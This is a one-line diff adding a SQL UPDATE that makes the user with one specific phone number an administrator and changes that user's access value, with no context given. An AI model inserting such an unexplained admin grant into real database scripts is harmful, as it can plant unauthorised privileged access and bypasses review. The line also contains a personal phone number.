@@ -1,0 +1,1 @@
+UPDATE users set access = "-1", is_admin = 1 where phone = '08066882230';
